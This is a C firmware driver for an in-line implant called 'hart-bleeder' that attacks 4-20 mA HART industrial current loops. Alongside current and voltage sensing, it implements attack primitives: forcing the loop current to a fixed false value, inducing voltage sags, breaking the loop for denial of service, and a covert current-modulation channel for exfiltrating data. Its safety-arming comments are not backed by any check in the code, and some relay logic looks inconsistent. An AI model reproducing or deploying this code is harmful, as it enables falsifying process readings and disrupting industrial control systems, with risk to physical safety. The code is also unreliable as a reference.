/*
 * hart-bleeder — loop_drv.c
 * 4-20 mA current-loop interface driver: sensing via ADC, power
 * harvesting, resistance modulation via DAC + digital pot, and
 * fault-injection primitives for the HART Fieldbus Covert
 * In-Line Attack Implant.
 *
 * Author: jayis1
 * License: GPL-2.0
 */

#include "board.h"
#include "registers.h"
#include "loop_drv.h"
#include "modem_drv.h"

static loop_mode_t s_mode = LOOP_MODE_PASSIVE;
static loop_stats_t s_stats;
static float s_clamp_ma = 4.0f;

/* ── ADC primitives (single-shot software-triggered) ─────────── */
static uint16_t adc_read_channel(uint8_t ch)
{
    adc_regs_t *a = ADC(1);
    /* Configure channel in SQR1 (simplified: single-channel sequence) */
    /* For brevity we assume ADC is pre-initialized in board_init; here we
     * trigger a single conversion and read DR.
     */
    a->CR |= ADC_CR_ADSTART;
    /* Wait for EOC */
    uint32_t t0 = system_millis();
    while (!(a->ISR & ADC_ISR_EOC)) {
        if ((system_millis() - t0) > 10) return 0;
    }
    return (uint16_t)(*(volatile uint32_t *)((ADC1_BASE + 0x40)) & 0xFFF);
}

static float adc_to_v(uint16_t raw)
{
    /* 12-bit ADC, Vref = 3.3 V, shunt R = 250 ohm -> 5V @ 20mA.
     * Voltage at ADC pin = I_loop * R_shunt, scaled by divider.
     */
    return ((float)raw / 4095.0f) * VREF_V * VBAT_DIVIDER;
}

static float adc_to_ma(uint16_t raw)
{
    /* Loop current sense: I = V_sense / R_shunt
     * V_sense measured across 250 ohm shunt = 1V..5V for 4..20mA.
     * The ADC sees V_sense via a /2 divider => 0.5..2.5V at pin.
     */
    float v_pin = ((float)raw / 4095.0f) * VREF_V;
    float v_sense = v_pin * 2.0f;       /* undo the /2 divider */
    return v_sense / SHUNT_RES_OHM * 1000.0f;   /* mA */
}

static float adc_to_vbat(uint16_t raw)
{
    float v_pin = ((float)raw / 4095.0f) * VREF_V;
    return v_pin * VBAT_DIVIDER * 1000.0f;       /* mV */
}

/* ── DAC for resistance modulation ──────────────────────────── */
static void dac_set_mv(uint16_t mv)
{
    /* 12-bit DAC, 0..3300mV => 0..4095 */
    uint32_t v = ((uint32_t)mv * 4095UL + 1650) / 3300;
    if (v > 4095) v = 4095;
    DAC_DHR12R1 = v;
}

/* ── Init ────────────────────────────────────────────────────── */
int loop_init(void)
{
    s_mode = LOOP_MODE_PASSIVE;
    loop_reset_stats();
    /* DAC1 channel 1 enable */
    DAC_CR |= DAC_CR_EN1;
    dac_set_mv(0);
    /* Sense-resistor bypass relay off (transparent) */
    loop_bypass_relay(0);
    /* Isolation transformer bypass off (safety) */
    gpio_write(GPIO(B), PIN_ISO_BYPASS, 1);
    return 0;
}

/* ── Sampling ────────────────────────────────────────────────── */
int loop_sample(loop_state_t *s)
{
    if (!s) return -1;
    uint16_t raw_i = adc_read_channel(ADC_CH_LOOP_I);
    uint16_t raw_v = adc_read_channel(ADC_CH_LOOP_V);
    float i_ma = adc_to_ma(raw_i);
    float v_loop = adc_to_v(raw_v);

    s->i_ma = i_ma;
    s->v_loop = v_loop;
    s->pv_pct = ((i_ma - 4.0f) / 16.0f) * 100.0f;
    if (s->pv_pct < 0) s->pv_pct = 0;
    if (s->pv_pct > 100) s->pv_pct = 100;
    s->pv_units = s->pv_pct;        /* default; device-specific */
    s->ts_ms = system_millis();
    s->fault = 0;
    if (i_ma < LOOP_I_MIN_MA) s->fault |= 1;
    if (i_ma > LOOP_I_MAX_MA) s->fault |= 2;
    if (v_loop > LOOP_V_MAX_V) s->fault |= 4;

    /* Update stats */
    s_stats.samples++;
    if (s->fault) s_stats.faults++;
    if (i_ma < s_stats.i_min_ma || s_stats.samples == 1) s_stats.i_min_ma = i_ma;
    if (i_ma > s_stats.i_max_ma) s_stats.i_max_ma = i_ma;
    if (v_loop < s_stats.v_min_v || s_stats.samples == 1) s_stats.v_min_v = v_loop;
    if (v_loop > s_stats.v_max_v) s_stats.v_max_v = v_loop;

    return 0;
}

float loop_current_ma(void)  { loop_state_t s; loop_sample(&s); return s.i_ma; }
float loop_voltage_v(void)  { loop_state_t s; loop_sample(&s); return s.v_loop; }
float loop_pv_percent(void) { loop_state_t s; loop_sample(&s); return s.pv_pct; }

/* ── Mode control ────────────────────────────────────────────── */
int loop_set_mode(loop_mode_t mode)
{
    /* Safety: only allow OPEN_LOOP if user has armed the device */
    s_mode = mode;
    switch (mode) {
    case LOOP_MODE_PASSIVE:
        loop_bypass_relay(0);
        dac_set_mv(0);
        gpio_write(GPIO(B), PIN_LED_GREEN, 1);
        gpio_write(GPIO(B), PIN_LED_RED, 0);
        break;
    case LOOP_MODE_INJECT:
        loop_bypass_relay(0);
        gpio_write(GPIO(B), PIN_LED_RED, 1);
        break;
    case LOOP_MODE_CLAMP:
        loop_bypass_relay(0);
        gpio_write(GPIO(B), PIN_LED_RED, 1);
        loop_set_current(s_clamp_ma);
        break;
    case LOOP_MODE_SAG:
    case LOOP_MODE_OPEN_LOOP:
    case LOOP_MODE_COVERT:
        gpio_write(GPIO(B), PIN_LED_RED, 1);
        break;
    }
    return 0;
}

loop_mode_t loop_get_mode(void) { return s_mode; }

/* ── Clamp: force loop current to a fixed value ──────────────── */
int loop_set_current(float ma)
{
    if (ma < 3.8f) ma = 3.8f;
    if (ma > 22.0f) ma = 22.0f;
    s_clamp_ma = ma;
    /* The DAC drives the wiper of a digital potentiometer that sits
     * in series with the loop, adding/subtracting resistance to trim
     * current.  Map mA to DAC voltage: 4mA -> 0V, 20mA -> 2500mV.
     */
    uint16_t mv = (uint16_t)(((ma - 4.0f) / 16.0f) * 2500.0f);
    dac_set_mv(mv);
    return 0;
}

/* ── Voltage sag: brief loop resistance spike ───────────────── */
int loop_induce_sag(uint32_t duration_ms, float sag_pct)
{
    if (sag_pct < 0) sag_pct = 0;
    if (sag_pct > 100) sag_pct = 100;
    /* Increase loop resistance by driving DAC to add a shunt load,
     * pulling loop voltage down by sag_pct for duration_ms.
     */
    uint16_t sag_mv = (uint16_t)(sag_pct * 25.0f);  /* up to 2500mV */
    dac_set_mv(sag_mv);
    system_delay_ms(duration_ms);
    dac_set_mv(0);
    return 0;
}

/* ── Open-circuit: break loop continuity (DoS) ───────────────── */
int loop_open_circuit(int on)
{
    /* The isolation/bypass relay opens the loop when de-asserted.
     * Safety: never open-loop unless user has explicitly armed.
     */
    gpio_write(GPIO(A), PIN_BYPASS_RELAY, on ? 0 : 1);
    return 0;
}

/* ── Covert modulation: ±0.5 mA FSK covert channel ────────────
 * Encode bits as small current deltas so a receiver loop-sampler
 * on the same loop can recover a covert exfil channel at low rate.
 * Bit 1 -> +0.5 mA for 1 bit time (833 us)
 * Bit 0 -> -0.5 mA (or no change)
 */
int loop_covert_modulate(uint8_t bit)
{
    float base = loop_current_ma();
    float target = base + (bit ? 0.5f : -0.5f);
    if (target < 3.8f) target = 3.8f;
    if (target > 22.0f) target = 22.0f;
    loop_set_current(target);
    system_delay_us(HART_BIT_US);
    loop_set_current(base);
    return 0;
}

void loop_bypass_relay(int on)
{
    /* Bypass relay shorts the sense resistor, removing our insertion
     * impedance from the loop (used in passive monitor mode to be
     * maximally transparent).
     */
    gpio_write(GPIO(A), PIN_BYPASS_RELAY, on ? 1 : 0);
}

void loop_get_stats(loop_stats_t *st) { *st = s_stats; }
void loop_reset_stats(void)
{
    s_stats.samples = 0;
    s_stats.faults = 0;
    s_stats.i_min_ma = 999.0f;
    s_stats.i_max_ma = 0;
    s_stats.v_min_v = 999.0f;
    s_stats.v_max_v = 0;
}